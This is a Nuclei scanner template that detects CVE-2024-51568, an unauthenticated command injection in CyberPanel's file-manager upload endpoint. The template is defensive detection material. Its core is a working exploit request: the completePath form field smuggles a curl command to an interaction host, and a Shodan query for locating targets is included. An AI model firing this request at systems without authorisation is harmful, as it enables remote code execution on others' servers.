http:
- extractors:
  - group: 1
    internal: true
    name: csrftoken
    part: header
    regex:
    - csrftoken=([A-Za-z0-9]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(interactsh_protocol, "dns")
    - contains_all(body, "status\":", "error_message\":")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /filemanager/upload HTTP/1.1

    Host: {{Hostname}}

    X-CSRFToken: {{csrftoken}}

    Content-Type: multipart/form-data; boundary=----NewBoundary{{boundary}}


    ------NewBoundary{{boundary}}

    Content-Disposition: form-data; name="domainName"


    {{Hostname}}

    ------NewBoundary{{boundary}}

    Content-Disposition: form-data; name="completePath"


    ; curl -X POST http://{{interactsh-url}}

    ------NewBoundary{{boundary}}

    Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"


    pwd

    ------NewBoundary{{boundary}}--

    '
id: CVE-2024-51568
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-51568
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-78
    epss-percentile: 0.9972
    epss-score: 0.92503
  description: 'CyberPanel (aka Cyber Panel) before 2.3.5 allows Command Injection
    via completePath in the ProcessUtilities.outputExecutioner() sink. There is /filemanager/upload
    (aka File Manager upload) unauthenticated remote code execution via shell metacharacters.

    '
  impact: 'Attackers can exploit this vulnerability to compromise system security.

    '
  metadata:
    max-request: 2
    product: cyberpanel
    shodan-query: http.html:"login to your cyberpanel account"
    vendor: cyberpanel
    verified: true
  name: CyberPanel - Command Injection
  reference:
  - https://www.rapid7.com/db/modules/exploit/unix/webapp/cyberpanel_preauth_rce_multi_cve/
  - https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce
  - https://nvd.nist.gov/vuln/detail/CVE-2024-51568
  - https://cyberpanel.net/blog/cyberpanel-v2-3-5
  remediation: 'Apply security patches to address CVE-2024-51568.

    '
  severity: critical
  tags: cve,cve2024,cyberpanel,rce,intrusive,vkev,vuln
variables:
  boundary: '{{to_lower(rand_base(9))}}'
  filename: '{{to_lower(rand_text_alpha(5))}}'
